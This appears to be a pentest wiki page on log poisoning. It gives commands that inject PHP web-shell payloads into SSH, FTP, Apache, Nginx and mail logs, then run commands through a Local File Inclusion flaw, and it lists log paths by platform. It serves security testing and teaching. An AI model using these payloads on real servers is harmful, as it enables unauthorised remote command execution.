---
authors: ShutdownRepo
category: web
---

# logs poisoning

> [!WARNING]
> Log files may be stored in different locations depending on the operating system/distribution.

::: details /var/log/auth.log
For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
# Sending the payload via SSH
ssh '<php system($_GET['cmd'])?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```
:::


::: details /var/log/vsftpd.log
When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).

```bash
# Sending the payload via FTP
ftp $TARGET_IP
> '<php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
```
:::


::: details /var/log/apache2/access.log
When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.

* About `access.log`: records all requests processed by the server.
* About netcat: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
* Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
* FreeBSD Apache access log file location: `/var/log/httpd-access.log`
* Windows Apache access log file location: **** `C:\xampp\apache\logs`

Or if the web server is under Nginx :

* Linux Nginx access log file location: `/var/log/nginx/access.log`
* Windows Nginx access log file location: `C:\nginx\log`
:::


::: details /var/log/apache/error.log
This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

* About `error.log`: records any errors encountered in processing requests.
* About netcat: using netcat avoids URL encoding.

```bash
# Sending the payload via netcat
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
```

There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `error.log` path and file depending on the operating system/distribution:

* RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: `/var/log/httpd/error_log`
* Debian / Ubuntu Linux Apache error log file location: `/var/log/apache2/error.log`
* FreeBSD Apache error log file location: `/var/log/httpd-error.log`
* Windows Apache access log file location: **** `C:\xampp\apache\logs`

Or if the web server is under Nginx :

* Linux Nginx access log file location: `/var/log/nginx`
* Windows Nginx access log file location: `C:\nginx\log`
:::


::: details /var/log/mail.log
When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<?php system($_GET['cmd']); ?>

# Accessing the log file via LFI
curl --user-agent "PENTEST" "$URL/?parameter=/var/log/mail.log&cmd=id"
```
:::
